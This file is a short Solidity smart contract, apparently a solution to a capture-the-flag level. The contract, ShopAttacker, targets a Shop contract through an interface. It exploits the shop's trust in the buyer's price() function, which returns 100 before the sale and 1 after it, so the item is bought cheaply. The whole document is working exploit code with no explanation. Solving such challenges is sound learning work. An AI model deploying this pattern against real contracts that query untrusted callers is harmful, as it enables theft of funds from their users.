// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function isSold() external view returns (bool);
    function buy() external;
}


contract ShopAttacker {
    address public owner;
    IShop public target;
    

    constructor(address _shopAddress){
        owner = msg.sender;
        target = IShop(_shopAddress);
    }

    modifier onlyOwner {
    require(msg.sender == owner);
    _;
    }


    function price() external view returns (uint256){
        if(!target.isSold()){
            return 100;
        } else {
            return 1;
        }
    }

    function attack() public onlyOwner{
        target.buy();
    }
}